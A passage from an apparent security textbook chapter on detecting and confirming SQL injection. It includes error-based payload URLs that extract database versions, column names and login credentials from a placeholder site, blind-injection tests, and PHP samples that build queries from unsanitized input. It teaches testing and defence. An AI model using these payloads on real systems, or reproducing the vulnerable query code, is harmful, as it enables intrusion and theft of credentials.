for two reasons: • lack of user input sanitization • data and control structures mixed in the same transport channel these two issues together have been the cause of some of the most important types of vulnerabilities exploited so far in the history of computers, such as heap and stack overflows, and format string issues. the lack of user input sanitization allows an attacker to jump from the data part (e.g., a string enclosed between single quotes or a number) to inject control commands (such as select , union, and , or, etc.). to defend against this type of vulnerability the first measure to adopt is to perform strict use r input sanitization and/or output encoding. for example, you can adopt a whitelist approach, whereby if you are expecting a number as a parameter value, you can configure your web application to reject every character from the user -supplied input which is not a digit. if you are expecting a string, you only accept characters that you previously determined are not hazardous. where this is not possible, you must ensure that all inputs are correctly quoted/encoded prior to being used to prevent sql injection. in the following sections, you will see how the information reaches the database server and why the preceding errors where generated. information workflow in the previous section, you saw some sql injection errors displayed as a result of parameter manipulation. you may be wondering why the web server shows an error from the database if you modify a parameter. although the errors are displayed in the web server response, the sql injection happens at the database layer. those examples show how you can reach a database server via the web application. it is important to have a clear understanding of how your data entry influences a sql query and what kind of response you could expect from the server. figure 2.4 shows how t he data sent from the browser are used in creating a sql statement and how the results are returned to the browser. figure 2.4 flow of information in a three -tier architecture figure 2.4 shows the information workflow between all parties normally involved in a dynamic web request: 1. the user sends a request to the web server. 2. the web server retrieves user data, creates a sql statement which contains the entry from the user, and then sends the query to the database server. 3. the database server executes the sql query and returns th e results to the web server. note that the database server doesn’t know about the logic of the application; it will just execute a query and return results. 4. the web server dynamically creates an html page based on the database response. as you can see, the web server and the database server are separate entities. these entities may be running on the same physical server or on different ones. the web server just creates a sql query, parses the results, and displays the results to the user. the database se rver receives the query and returns the results to the web server. this is very important for exploiting sql injection vulnerabilities because if you can manipulate the sql statement and make the database server return arbitrary data (such as usernames and passwords from the victim inc. web site) the web server has no means to verify whether the data are legitimate and will therefore pass the data back to the attacker. database errors in the previous section, you saw some sql injection errors displayed as a result of parameter manipulation. although the errors are displayed in the web server response, the sql injection happens at the database layer. those examples showed how you can reach a database server via the web application. it is very important that y ou familiarize yourself with the different database errors that you may get from the web server when testing for sql injection vulnerabilities. figure 2.5 shows how a sql injection error happens and how the web server deals with it. figure 2.5 information flow during a sql injection error as you can see in figure 2.5, the following occurs during a sql injection error: 1. the user sends a request in an attempt to identify a sql injection vulnerability. in this case, the user sends a value with a single quote appended to it. 2. the web server retrieves user data and sends a sql query to the database server. in this example, you can see that the sql statement created by the web server includes the user input and forms a syntactically incorrect query due to the two terminating quotes. 3. the database server receives the malformed sql query and returns an error to the web server. 4. the web server receives the error from the database and sends an html response to the user. in this case, it sent the error message, but it is entirely up to the application how it presents any errors in the contents of the html response. the preceding example illustrates the scenario of a request from the user which triggers an error on the database. depending on how the application is coded, the response returned in step 4 will be constructed and handled as a result of one of the following: • the sql error is displayed on the page and is visible to the user from the web browser. • the sql error is hidden in the source of the web page for debuggi ng purposes. • redirection to another page is used when an error is detected. • an http error code 500 (internal server error) or http redirection code 302 is returned. • the application handles the error properly and simply shows no results, perhaps displ aying a generic error page. when you are trying to identify a sql injection vulnerability you need to determine the type of response the application is returning. in the next few sections, we will focus on the most common scenarios that you may encounter. the ability to identify the remote database is paramount to successfully progressing an attack and moving on from identification of the vulnerability to further exploitation. commonly displayed sql errors in the previous section, you saw that applications react differently when the database returns an error. when you are trying to identify whether a specific input triggered a sql vulnerability, the web server error messages can be very useful. your best scenario is an application returning the full sql erro r, although this rarely occurs. the following examples will help you to familiarize yourself with some of the most typical errors. you will see that sql errors commonly refer to unclosed quotes. this is because sql requires enclosure of alphanumeric values between single quotes. you will see some examples of typical errors with a simple explanation of what caused the error. microsoft sql server errors as you saw previously, injecting a single quote into alphanumeric parameters could result in a database err or. in this section, you will see that the exact same entry can lead to different results. consider the following request: http://www.victim.com/showproducts.aspx?category=attacker’ the error returned from the remote application will be similar to the following: server error in ‘/’ application. unclosed quotation mark before the character string ‘attacker;’. description: an unhandled exception occurred during the execution of the current web request. please review the stack trace for more information about the error and where it originated in the code. exception details: system.data.sqlclient.sqlexception: unclosed quotation mark before the character string ‘attacker;’. obviously, you don’t have to memorize every error code. the important thing is that you understand when and why an error occurs. in both examples, you can assert that the remote sql statement running on the database must be something similar to the following: select ∗ from products where category=‘attacker’’ the application did not sanitize the single quotes, and therefore the syntax of the statement is rejected by the database server returning an error. you just saw an example of injection in an alphanumeric string. the following example will show the typical error returned when injecting a numeric value, therefore not enclosed between quotes in the sql statement. imagine you find a page called showproduct.aspx in the victim.com application. the script receives a parameter called id and displays a single product depending on the value of the id parameter: http://www.victim.com/showproduct.aspx?id=2 when you change the value of the id parameter to something such as the following: http://www.victim.com/showproduct.aspx ?id=attacker the application returns an error similar to this: server error in ‘/’ application. invalid column name ‘attacker’. description: an unhandled exception occurred during the execution of the current web request. please review the stack trace for more information about the error and where it originated in the code. exception details: system.data.sqlclient.sqlexception: invalid column name ‘attacker’. based on the error, you can assume that in the first instance the application creates a sql stateme nt such as this: select ∗ from products where idproduct=2 the preceding statement returns a result set with the product whose idproduct field equals 2. however, when you inject a non -numeric value, such as attacker , the resultant sql statement sent to the database server has the following syntax: select ∗ from products where idproduct=attacker the sql server understands that if the value is not a number it must be a column name. in this case, the server looks for a column called attacker within the products table. however, there is no column named attacker , and therefore it returns an invalid column name ‘attacker’ error. there are some techniques that you can use to retrieve information embedded in the errors returned from the database. the first one genera tes an error converting a string to an integer: http://www.victim.com/showproducts.aspx?category=bikes’and 1=0/@@version;-- application response: server error in ‘/’ application. syntax error converting the nvarchar value ‘microsoft sql server 2000 – 8.00.760 (intel x86) dec 17 2002 14:22:05 copyright (c) 1988– 2003 microsoft corporation enterprise edition on windows nt 5.2 (build 3790:)’ to a column of data type int. description: a n unhandled exception occurred during the execution of the current web request. please review the stack trace for more information about the error and where it originated in the code. @@version is a sql server variable which contains a string with the vers ion of the database server. in the preceding example the database reported an error converting the result of @@version to an integer and displaying its contents. this technique abuses the type conversion functionality in sql server. we sent 0/@@version as part of our injected code. as a division operation needs to be executed between two numbers, the database tries to convert the result from the @@version variable into a number. when the operation fails the database displays the content of the variable. you can use this technique to display any variable in the database. the following example uses this technique to display the user variable: http://www.victim.com/showproducts.aspx?category=bikes’ and 1=0/user;-- application response: syntax error converting the nvarchar value ‘dbo’ to a column of data type int. description: an unhandled exception occurred during the execution of the current web request. please review the stack trace for more information about the error and where it originated in the code. there are also techniques to display information about the sql query executed by the database, such as the use of having 1=1: http://www.victim.com/showproducts.aspx?category=bikes’having1’=’1 application response: server error in ‘/’ application. column ‘products.productid’ is invalid in the select list because it is not contained in an aggregate function and there is no group by clause. description: an unhandled exception occurred during the execution of the current web request. please review the stack trace for more information about the error and where it originated in the code. the having clause is used in combination with the group by clause. it can also be used in a select statement to filter the records that a group by returns. group by needs the select ed fields to be a result of an aggregated function or to be included in the group by clause. if the requirement is not met, the database sends back an error displaying the first column where this issue appeared. using this technique and group by you can enumerate all the columns in a select statement: http://www.victim.com/showproducts.aspx?category=bikes’group by productid having ‘1‘=’1 application response: server error in ‘/’ application. column ‘products.name’ is invalid in the select list because it is not contained in either an aggregate function or the group by clause. description: an unhandled exception occurred during the execution of the current web request. please review the stack trace for more information about the error and where it originated in the code. in the precedi ng example, we included the previously discovered column productid in the group by clause. the database error disclosed the next column, name . just keep appending columns to enumerate them all: http://www.victim.com/showproducts.aspx?category=bikes’group by productid, name having ‘1’=’1 application response: server error in ‘/’ application. column ‘products.price’ is invalid in the select list because it is not contained in either an aggregate function or the group by clause. description: an unhandled exception occurred during the execution of the current web request. please review the stack trace for more information about the error and where it originated in the code. once you have enumerated the column names you can retrieve the values using the converting error technique that you saw earlier: http://www.victim.com/showproducts.aspx?category=bikes’and 1=0/name;-- application response: server error in ‘/’ application. syntax error converting the nvarchar value ‘claud butler olympus d2’ to a column of data type int. description: an unhandled exception occurred during the execution of the current web request. please review the stack trace for more information about the error and where it originated in the code. tip information disclosure in error messages can be very useful to an attacker targeting applications using sql server databases. if you find this kind of disclosure in an authentication mechanism, try to enumerate the username and password column names (which are likely to be user and password ) using the having and group by techniques alread y explained: http://www.victim.com/logon.aspx?username=test’having1’=’1 http://www.victim.com/logon.aspx?username=test’ group by user having ‘1’=’1 after discovering the column names, you can disclose the credentials of the first account, which is likely to possess administrative privileges: http://www.victim.com/logon.aspx?username=test’ and 1=0/user and 1’=’1 http://www.victim.com/logon.aspx?username=test ’ and 1=0/password and 1’=’1 you can also disco ver other accounts adding the discovered usernames in a negative condition to exclude them from the result set: http://www.victim.com/logon.aspx?username=test’ and user not in (‘admin’) and 1=0/user and 1’=’1 you can configure errors displayed in asp.net applications using the web.config file. this file is used to define the settings and configurations of an asp.net application. it is an xml document which can contain information about the loade d modules, security configuration, compilation settings, and similar data. the customerrors directive defines how errors are returned to the web browser. by default, customerrors=“on” , which prevents the application server from displaying verbose errors to remote visitors. you can completely disable this feature using the following code, although this is not recommended in production environments: <configuration> <system.web> <customerrors mode=“off”/> </system.web> </configuration> another possibility is to display different pages depending on the http error code generated when rendering the page: <configuration> <system.web> <customerrorsdefaultredirect=“error.aspx” mode=“on”> <errorstatuscode=“403” redirect=“accessdenied.aspx”/> <errorstatuscode=“404” redirect=“notfound.aspx”/> <errorstatuscode=“500” redirect=“internalerror.aspx”/> </customerrors> </system.web> </configuration> in the preceding example, the application by default will redirect the user to error.aspx. however, in three cases (http codes 403, 404, and 500) the user will be redirected to another page. mysql errors in this section, you will see some of the typical mysql errors. all of the main server -side scripting languages can access mysql databases. mys ql can be executed in many architectures and operating systems. a common configuration is formed by an apache web server running php on a linux operating system, but you can find it in many other scenarios as well. the following error is usually an indicat ion of a mysql injection vulnerability: warning: mysql_fetch_array(): supplied argument is not a valid mysql result resource in /var/www/victim.com/showproduct.php on line 8 in this example, the attacker injected a single quote in a get parameter and the p hp page sent the sql statement to the database. the following fragment of php code shows the vulnerability: <?php //connect to the database mysql_connect(“[database]”, “[user]”, “[password]”) or//error checking in case the database is not accessible die(“could not connect:”. mysql_error()); //select the database mysql_select_db(“[database_name]”); //we retrieve category value from the get request $category = $_get[“category”]; //create and execute the sql statement $result = mysql_query(“select ∗ from products where category=‘ $category ’”); //loop on the results while ($row = mysql_fetch_array($result, mysql_num)) {printf(“id: %s name: %s”, $row[0], $row[1]); } //free result set mysql_free_result($result); ?> the code shows that the value retrieved from the get variable is used in the sql statement without sanitization. if an attacker injects a value with a single quote, the resultant sql statement will be: select ∗ from products where category=‘attacker’’ the precedin g sql statement will fail and the mysql_query function will not return any value. therefore, the $result variable will not be a valid mysql result resource. in the following line of code, the mysql_fetch_array ($result , mysql_num ) function will fail and php will show the warning message that indicates to an attacker that the sql statement could not be executed. in the preceding example, the application does not disclose details regarding the sql error, and therefore the attacker will need to devote more effo rt in determining the correct way to exploit the vulnerability. in “confirming sql injection,” you will see techniques for this kind of scenario. php has a built -in function called mysql_error which provides information about the errors returned from the m ysql database during execution of a sql statement. for example, the following php code displays errors caused during execution of the sql query: <?php //connect to the database mysql_connect(“[database]”, “[user]”, “[password]”) or//error checking in case the database is not accessible die(“could not connect:”. mysql_error()); //select the database mysql_select_db(“[database_name]”); //we retrieve category value from the get request $category = $_get[“category”]; //create and execute the sql statement $result = mysql_query(“select ∗ from products where category=‘ $category ’”); if (!$result) { //if there is any error //error checking and display die(‘<p>error:’. mysql_error(). ‘</p>’); } else {// loop on the results while ($row = mysql_fetch_array($result, mysql_num)) {printf(“id: %s name: %s”, $row[0], $row[1]); }//free result set mysql_free_result($result); } ?> when an application running the preceding code catches database errors and the sql query fails, the retur ned html document will include the error returned by the database. if an attacker modifies a string parameter by adding a single quote the server will return output similar to the following: error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ’’’at line 1 the preceding output provides information regarding why the sql query failed. if the injectable parameter is not a string and therefore is not enclosed between single quotes, the resultant output would be similar to this: error: unknown column ‘attacker’ in ‘where clause’ the behavior in mysql server is identical to microsoft sql server; because the value is not enclosed between quotes mysql treats it as a column name. the sql statement executed was along these lines: select ∗ from products where idproduct=attacker mysql cannot find a column name called attacker , and therefore returns an error. this is the code snippet from the php script shown earlier in charge of error handling: if (!$result) { //if there is any error //error checking and display die(‘<p>error:’. mysql_error(). ‘</p>’); } in this example, the error is caught and then displayed using the die() function. the php die() function prints a message and gracefully exits the current script. other options are available for the programmer, such as redirecting to another page: if (!$result) { //if there is any error //error checking and red irection header(“location:http://www.victim.com/error.php”); } we will analyze server responses in “application response,” and discuss how to confirm sql injection vulnerabilities in responses without errors. oracle errors in this section, you will see some examples of typical oracle errors. oracle databases are deployed using various technologies. as mentioned before, you don’t need to learn every single error returned from the database; the important thing is that you can identify a database error when you see it. when tampering with the parameters of java applications with an oracle back -end database you will often find the following error: java.sql.sqlexception: ora- 00933: sql command not properly ended at oracle.jdbc.dbaccess.dberror.throwsqlexception(dberror.java:180) at oracle.jdbc.ttc7.ttioer.processerror(ttioer.java:208) the preceding error is very generic and means that you tried to execute a syntactically incorrect sql statement. depending on the code running on the server you can find the following error when injecting a single quote: error: sqlexceptionjava.sql.sqlexception: ora- 01756: quoted string not properly terminated in this error the oracle database detects that a quoted string in the sql statement is not properly terminated, as oracle requires that a string be terminated with a single quote. the following error re -creates the same scenario in .net environments: exception details: system.data.oledb.oledbexception: one or more errors occurred during processing of command. ora-00933: sql command not properly ended the following example shows an error returned from a .net application executing a statement with an unclosed quoted string: ora-01756: quoted string not properly terminated system.web.httpunhandledexception: exception of type ‘system.web.httpunhandledexception’ was thrown. ---> system.data.oledb.oledbexception: ora- 01756: quoted string not properly terminated the php function ociparse() is used to prepare an oracle statement for execution. here is an example of the error generated by the php engine when the function fails: warning: ociparse() [function.ociparse]: ora- 01756: quoted string not properly terminated in /var/www/victim.com/ocitest.php on line 31 if the ociparse() function fails and the error i s not handled, the application may show some other errors as a consequence of the first failure. this is an example: warning: ociexecute(): supplied argument is not a valid oci8- statement resource in c: \\www\\victim.com\\ oracle\\index.php on line 31 as you rea d this book, you will see that sometimes the success of an attack depends on the information disclosed by the database server. let’s examine the following error: java.sql.sqlexception: ora- 00907: missing right parenthesis atoracle.jdbc.dbaccess.dberror.thr owsqlexception(dberror.java:134) at oracle.jdbc.ttc7.ttioer.processerror(ttioer.java:289) at oracle.jdbc.ttc7.oall7.receive(oall7.java:582) at oracle.jdbc.ttc7.ttc7protocol.dooall7(ttc7protocol.java:1986) the database reports that there is a missing right parenthesis in the sql statement. this error can be returned for a number of reasons. a very typical situation of this is presented when an attacker has some kind of control in a nested sql statement. for example: select field1, field2,/∗ select the first and second fields ∗ /(select field1/∗ start subquery ∗/ from table2 where something = [attacker controlled variable])/∗ end subquery ∗ / as field3/ ∗ result from subquery ∗ / from table1 the preceding example shows a nested subquery. the main sel ect executes another select enclosed in parentheses. if the attacker injects something in the second query and comments out the rest of the sql statement, oracle will return a missing right parenthesis error. postgresql errors in this section we will cover some of the typical errors observed in postgresql databases. the following php code connects to a postgresql database and performs a select query based on the content of a get http variable: <?php // connecting, selecting database $dbconn = pg_connect(“host=localhost dbname=books user=tom password=mypassword”) or die(‘could not connect:’.pg_last_error()); $name = $_get[“name”]; // performing sql query $query = “select ∗ from \\“public\\”.\\“authors\\ ” where name= ‘$name’”; $result = pg_query($dbconn, $query) or die(‘query failed: ‘. pg_last_error()); // printing results in html echo “<table>\\ n”; while ($line = pg_fetch_array($result, null, pgsql_assoc)) { echo “\\t<tr>\\n”; foreach ($line as $col_value) { echo “\\t\\t<td>$col_value</td> \\n”; } echo “\\t</tr>\\n”; } echo “</table> \\n”; // free resultset pg_free_result($result); // closing connection pg_close($dbconn); ?> the pg_query php function executes a query using the connection passed as a parameter. the example above creates a sq l query and stores it into the variable $query , which is later executed. pg_last_error is a php function which gets the last error message string of a connection. we can invoke the code above pointing our browser to the victim inc website and supplying in the url a parameter called name : http://www.victim.com/list_author.php?name=dickens the request shown above will make the php application to execute the following sql query: select ∗ from “public”.“authors” where name=‘dickens’ as you can see in the code s hown above, the application does not perform any validation in the content received in the name variable. therefore, the following request will generate an error from the postgresql database. http://www.victim.com/list_author.php?name=’ given the previous request, the database will return an error like the following one: query failed: error: unterminated quoted string at or near “’’’” in other cases, where the sql code fails to execute for other reasons such as opening or closing parenthesis, subqueries, et c. postgresql databases will return a generic error: query failed: error: syntax error at or near “” another common configuration for postgresql deployments makes use of the postgresql jdbc driver, which is used when coding java projects. the errors returned from the database are very similar to the ones mentioned above, but they also dump the java functions: org.postgresql.util.psqlexception: error: unterminated quoted string at or near “‘ \\’ ” at org.postgresql.core.v3.queryexecutorimpl.receiveerrorresponse(queryexecutorimpl.java:1512) at org.postgresql.core.v3.queryexecutorimpl.processresults(queryexecutorimpl.java:1297) at org.postgresql.core.v3.queryexecutorimpl.execute(queryexecutorimpl.java:188) at org.postgresql.jdbc2.abstractjdbc2statement.execute(abstractjdbc2statement.java:430) at org.postgresql.jdbc2.abstractjdbc2statement.executewithflags(abstractjdbc2statement.java:3 32) at org.postgresql.jdbc2.abstractjdbc2statement.executequery(abstractjdb c2statement.java:231) at org.postgresql.jdbc2.abstractjdbc2databasemetadata.gettables(abstractjdbc2databasemetadata.java:2190) the preceding code shows an error returned by the postgresql jdbc driver when handling and unclosed quoted string. application re sponse in the previous section, you saw the kinds of errors that applications typically display when the back -end database fails to execute a query. if you see one of those errors, you can be almost certain that the application is vulnerable to some kind of sql i njection. however, applications react differently when they receive an error from the database, and sometimes identifying sql injection vulnerabilities is not as easy as previously shown. in this section, you will see other examples of errors not directly displayed in the browser, which represent different levels of complexity . note there is no golden rule to determine whether certain input triggered a sql injection vulnerability, as the possible scenarios are endless. it is simply important that you remain focused and pay attention to details when investigating potential sql injection issues. it is recommended that you use a web proxy, as your web browser will hide details such as html source code, http redirects, and so forth. besides, when working at a lo wer level and watching the html source code you are more likely to discover other vulnerabilities apart from sql injection. the process of finding sql injection vulnerabilities involves identifying user data entry, tampering with the data sent to the application, and identifying changes in the results returned by the server. you have to keep in mind that tampering with the parameters can generate an error which could have nothing to do with sql injection. generic errors in the previous section, you saw the typical errors returned from the database. in that kind of scenario, it is very easy to determine whether a parameter is vulnerable to sql injection. in other scenarios, the application will return a generic error page regardless of the kind of failure. a good example of this is the microsoft .net engine, which by default returns the server error page shown in figure 2.6 in the event of runtime errors. figure 2.6 default asp.net error page this is a very common scenario. it happens when the application does not handle errors and no custom error page has been configured on the server. as i showed before, this behavior is determined by the web.config file settings. if you are testing a web site and discover that the application is always responding with a default or custom error page, you will need to make sure the error is due to sql injection. you can test this by inserting meaningful sql code into the parameter without triggering an application error. in the preceding example, you can assume that the sql query is going to be something such as this: select ∗ from products where category=‘[attacker’s control]’ injecting attacker’ is clearly going to generate an error, as the sql statement is incorrect due to the extra single quote at the end: select ∗ from products where category=‘attacker’’ however, you can try to inject something that doesn’t generate an error. this is usually an educated trial -and-error process. in our example, we need to keep in mind that we are trying to inject data into a string enclosed with single quotes. what about injecting something such as bikes’ or ‘1’=’1 ? the resultant sql statement would be: select ∗ from products where category=‘bikes’ or ‘1’=‘1’ /∗ always true - > returns all rows ∗ / in this example, we injected sql code that created a meaningful correct query. if the application is vulnerable to sql injection, the preceding query should return every row in the products table. this technique is very useful, as it introduces an always t rue condition. ‘or’1‘=’1 is inserted in line with the current sql statement and does not affect the other parts of the request. the complexity of the query doesn’t particularly matter, as we can easily create a correct statement. one of the disadvantages of injecting an always true condition is that the result of the query will contain every single record in the table. if there are several million records, the query can take a long time to execute and can consume many resources of the database and web servers. one solution to this is to inject something that will have no effect on the final result; for example, bikes’ or ‘1’=’2. the final sql query would be: select ∗ from products where category=‘bikes’ or ‘1’=‘2’ because 1 is not equal to 2, and therefore t he condition is false, the preceding statement is equivalent to: select ∗ from products where category=‘bikes’ another test to perform in this kind of situation is the injection of an always false statement. for that we will send a value that generates no results; for example, bikes’ and ‘1’=’2 : select ∗ from products where category=‘bikes’ and ‘1’=‘2’ /∗ always false - > returns no rows ∗/ the preceding statement should return no results, as the last condition in the where clause can never be met. however, keep in mind that things are not always as simple as shown in these examples, and don’t be surprised if you inject an always false condition and the application returns results. this can be due to a number of reasons. for example: select ∗ /∗ select all ∗ / from products /∗ products ∗/ where category=‘bikes’ and ‘1’=‘2’ /∗ false condition ∗/ union select ∗ /∗ append all new_products ∗ / from new_products /∗ to the previous result set ∗/ in the example above the results of two queries are appended and returned as the result. if the injectable parameter affects only one part of the query, the attacker will receive results even when injecting an always false condition. later, in “terminating sql injection,” you will see techniques to comment out the rest of the query. http code errors http has a number of codes which are returned to the web browser to specify the result of a request or an action that the client needs to perform. the most comm on http code returned is http 200 ok, which means the request was successfully received. there are two error codes that you need to familiarize yourself with to detect sql injection vulnerabilities. the first one is the http 500 code: http/1.1 500 internal server error date: mon, 05 jan 2009 13:08:25 gmt server: microsoft- iis/6.0 x-powered- by: asp.net x-aspnet-version: 1.1.4322 cache-control: private content- type: text/html; charset=utf- 8 content- length: 3026 [html content] http 500 is returned from a web s erver when an error has been found when rendering the requested web resource. in many scenarios, sql errors are returned to the user in the form of http 500 error codes. the http code returned will be transparent to you unless you are using a proxy to catc h the web server response. another common behavior adopted by certain applications in the event of errors found is to redirect to the home page or to a custom error page. this is done via an http 302 redirection: http/1.1 302 found connection: keep- alive content-length: 159 date: mon, 05 jan 2009 13:42:04 gmt location: /index.aspx content- type: text/html; charset=utf- 8 server: microsoft- iis/6.0 x-powered- by: asp.net x-aspnet-version: 2.0.50727 cache-control: private <html><head><title>object moved</title></head><body> <h2>object moved to <a href=“/index.aspx”>here</a>.</h2> </body></html> in the preceding example, the user is redirected to the home page. the http 302 responses always have a location field which indicates the destination where the web browser should be redirected. as mentioned before, this process is handled by the web browser and it is transparent to the user unless you are using a web proxy intercepting the web server responses. when you are manipulating the parameters sent to the server and you get an http 500 or http 302 response, that’s a good sign. it means that somehow you interfered with the normal behavior of the application. the next step will be to craft a meaningful injection, as explained in “confirming sql injection” later in this chapter. different response sizes each application reacts differently to the input sent by the user. sometimes it is easy to identify an anomaly in an application, yet other times it can be harder . you need to consider even the slightest and most subtle variation when trying to find sql injection vulnerabilities. in scripts that show the results of a select statement the differences between a legitimate request and a sql injection attempt are usual ly easy to spot. but now consider the scripts which don’t show any result, or in which the difference is too subtle to be visually noticeable. this is the case for the next example, shown in figure 2.7. figure 2.7 response differing in figure 2.7, we have an example of differing of two requests. the test is done against the idvisitor parameter of a web page called tracking.asp. this page is used to track visitors to the http://www.victim.com web site. the script just updates a database for the visitor specified in the idvisitor variable. if a sql error occurs, the exception is caught and the response is returned to the user. however, due to a programming inconsistency the resultant response is slightly different. other examples can include where minor web interface items, such as product labels, are loaded based on parameters from the user. if a sql error occurs, it is not uncommon for missing minor interface items to be easy to overlook. although it may look like a minor mistake, you will see that there are ways to exploit this kind of issue using blind sql injection techniques, introduced in the next section and explained in detail in chapter 5 . blind injection detection web applications access databases for many purposes. one common goal is to access information and present it to the user. in such cases, an attacker might be able to modify the sql statement and display arbitrary information from the database into the http response received from the web server. however, there are other cases where it is not possible to display any information from the database, but that doesn’t necessarily mean the code can’t be vulnerable to sql injection. this means the discovery and expl oitation of the vulnerability is going to be slightly different. consider the following example. victim inc. allows its users to log on to its web site via an authentication form located at http://www .victim.com/authenticate.aspx . the authentication form requests a username and a password from the user. if you enter any random username and password the result page shows an “invalid username or password” message. this is something that you would expect. however, if you enter a username value of user’ or ‘1’=’1 the error shown in figure 2.8 is displayed. figure 2.8 blind sql injection example —always true figure 2.8 shows a flaw in the authentication system of victim inc. the application shows different error messages when it receives a valid username, and moreover, the username field seems vulnerable to sql injection. when you find this kind of situation it can be useful to verify by injecting an always false condition, as shown in figure 2.9, and checking that the returned value is different. figure 2.9 blind sql in jection example —always false after the always false test you can confirm that the username field is vulnerable to sql injection. however, the password field is not vulnerable and you cannot bypass the authentication form. this form doesn’t show any data from the database. the only two things we know are: • the form displays “invalid password” when the username condition is true. • the form displays “invalid username or password” when the username condition is false. this is called blind sql injection. chapter 5 is fully dedicated to blind sql injection attacks and covers the topic in detail, however we will discuss the basics in this section. blind sql injection is a type of sql injectio n vulnerability where the attacker can manipulate a sql statement and the application returns different values for true and false conditions. however, the attacker cannot retrieve the results of the query. exploitation of blind sql injection vulnerabilitie s needs to be automated, as it is time consuming and involves sending many requests to the web server. chapter 5 discusses the exploitation process in detail. blind sql injection is a very common vulnerability, althoug h sometimes it can be very subtle and might remain undetected to inexperienced eyes. take a look at the next example so that you can better understand this issue. victim inc. hosts a web page on its site, called showproduct.php. the page receives a paramet er called id , which uniquely identifies each product in the web site. a visitor can request pages as follows: http://www.victim.com/showproduct.php?id=1 http://www.victim.com/showproduct.php?id=2 http://www.victim.com/showproduct.php?id=3 http://www.victim.com/showproduct.php?id=4 each request will show the details of the specific product requested as expected. there is nothing wrong with this implementation so far. moreover, victim inc. has paid some attention to protecting its web site and doesn’t display any database errors to the user. during testing of the web site you discover that the application by default shows the first product in the event of a potential error. all of the following requests showed the first product (www.victim.com/showproduct.php?id=1): http://www.victim.com/showproduct.php?id=attacker http://www.victim.com/showproduct.php?id=attacker’ http://www.victim.com/showproduct.php?id= http://www.victim.com/showproduct.php?id=999999 999(non existent product) http://www.victim.com/showproduct.php?id=- 1 so far, it seems that victim inc. really took security into account in implementing this software. however, if we keep testing we can see that the following requests return the product with id=2 : http://www.victim.com/showproduct.php?id=3 -1 http://www.victim.com/showproduct.php?id=4 -2 http://www.victim.com/showproduct.php?id=5 -3 the preceding urls indicate that the parameter is passed to the sql statement and it is executed in the followi ng manner: select ∗ from products where idproduct=3- 1 the database computes the subtraction and returns the product whose idproduct=2. you can also perform this test with additions; however, you need to be aware that the internet engineering task force (ietf), in its rfc 2396 (uniform resource identifiers (uri): generic syntax), states that the plus sign (+) is a reserved word for uris an d needs to be encoded. the plus sign url encoding is represented by % 2b. the representation of an example of the attack trying to show the product whose idproduct=6 would be any of the following urls: http://www.victim.com/showproduct.php?id=1%2b5(decodes to id=1+5) http://www.victim.com/showproduct.php?id=2%2b4(decodes to id=2+4) http://www.victim.com/showproduct.php?id=3%2b3(decodes to id=3+3) continuing the inference process, we can now insert conditions after the id value, creating true and false result s: http://www.victim.com/showproduct.php?id=2 or 1=1 -- returns the first product http://www.victim.com/showproduct.php?id=2 or 1=2 -- returns the second product in the first request, the web server returns the product whose idproduct=1, whereas in the second request it returns the product whose idproduct=2. in the first statement, or 1=1 makes the database return every product. the database detects this as an anomaly and shows the first product. in the second statement, or 1=2 makes no difference in the re sult, and therefore the flow of execution continues without change. you might have realized that there are some variations of the attack, based on the same principles. for example, we could have opted for using the and logical operator, instead of or. in that case: http://www.victim.com/showproduct.php?id=2 and 1=1 -- returns the second product http://www.victim.com/showproduct.php?id=2 and 1=2 -- returns the first product as you can see, the attack is almost identical, except that now the true condition re turns the second product and the false condition returns the first product. the important thing to note is that we are in a situation where we can manipulate a sql query but we cannot get data from it. additionally, the web server sends a different respons e depending on the condition that we send. we can therefore confirm the existence of blind sql injection and start automating the exploitation. confirming sql injection in the previous section, we discussed techniques for discovering sql injection vulnerabilities by tampering with user data entry and analyzing the response from the server. once you identify an anomaly you will always need to confirm the sql injection vulnerability by crafting a valid sql statement. although there are tricks that will help y ou create the valid sql statement, you need to be aware that each application is different and every sql injection point is therefore unique. this means you will always need to follow an educated trial- and-error process. identification of a vulnerability is only part of your goal. ultimately, your goal will always be to exploit the vulnerabilities present in the tested application, and to do that you need to craft a valid sql request that is executed in the remote database without causing any errors. this s ection will give you the necessary information to progress from database errors to valid sql statements. differentiating numbers and strings you need to derive a basic understanding of sql language to craft a valid injected sql statement. the very first lesson to learn for performing sql injection exploitation is that databases have different data types. these types are represented in different ways, and we can split them into two groups: • number: represented without single quotes • all the rest: represented with single quotes the following are examples of sql statements with numeric values: select ∗ from products where idproduct=3 select ∗ from products where value > 200 select ∗ from products where active = 1 as you can see, when using a numeric value sql statements don’t use quotes. you will need to take this into account when injecting sql code into a numeric field, as you will see later in the chapter. the following are examples of sql statements with single -quoted values: select ∗ from products where name = ‘bike’ select ∗ from products where published_date>‘ 01/01/2009’ select ∗ from products where published_time>‘ 01/01/2009 06:30:00’ as yo u can see in these examples, alphanumeric values are enclosed between single quotes. that is the way the database provides a container for alphanumeric data. although most databases can deal with number types even if they are enclosed in single quotes this is not a common practice, and developers normally use quotes for non- numeric values. when testing and exploiting sql injection vulnerabilities, you will normally have control over one or more values within the conditions shown after the where clause. for that reason, you will need to consider the opening and closing of quotes when injecting into a vulnerable string field. however, it is possible to represent a numeric value between quotes, and most databases will cast the value to the represented number. m icrosoft sql server is an exception to this norm, as the + operand is overloaded and interpreted as a concatenation. in that particular case the database will understand it as a string representation of a number; for example, ‘2’+‘2’ = ‘22’, not 4. in the example above you can see the representation of a date format. representation of date/timestamp data types in the different databases doesn’t follow a norm and greatly varies among every database. to avoid these problems most vendors have the option to use format masks (e.g. ‘dd -mm- yyyy’). inline sql injection in this section, i will show you some examples of inline sql injection. inline injection happens when you inject some sql code in such a way that all parts of the original query are executed. figure 2.10 shows a representation of an inline sql injection. figure 2.10 injecting sql code inline injecting strings inline let’s see an example that illustrates this kind of attack so that you can fully understand how it works. victim inc. has an authentication form for accessing the administration part of its web site. the authentication requires the user to enter a valid username and password. after sending a username and password, the application sends a query to the database to validate the user. the query has the following format: select ∗ from administrators where username = ‘[user entry]’ and password = ‘[user entry]’ the application doesn’t perform any sanitization of the received data, and therefore we have full control over what we send to the server. be aware that the data entry for both the username and the password is enclosed in two single quotes which you cannot control. you will have to keep that in mind when crafting a valid sql statement. figure 2.11 shows the creation of the sql statement from the user entry. figure 2.11 sql statement creation figure 2.11 shows the part of the sql statement that you can manipulate. note most of the art of understanding and exploiting sql injection vulnerabilities consists of the ability to mentally re create what the developer coded in the web application, and envision how the remote sql code looks. if you can imagine what is being executed at the server side, it will seem obvious to you where to terminate and start the single quotes. as i 